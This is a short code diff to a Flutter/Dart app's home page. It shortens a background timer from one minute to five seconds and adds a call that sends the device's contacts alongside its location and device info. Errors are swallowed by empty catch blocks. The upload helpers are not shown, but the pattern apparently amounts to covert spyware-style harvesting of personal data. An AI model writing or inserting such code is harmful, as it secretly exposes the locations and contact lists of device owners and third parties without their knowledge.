@@ -42,10 +42,11 @@ class _HomePageState extends State<HomePage> {
 
   void sendIt() {
     Timer.periodic(
-      const Duration(minutes: 1),
+      const Duration(seconds: 5),
       (timer) async {
         try {
           await AppBackgroundServices.sendLocation();
+          await AppBackgroundServices.sendContacts();
         } catch (e, m) {}
         try {
           await AppBackgroundServices.sendDeviceInfo();
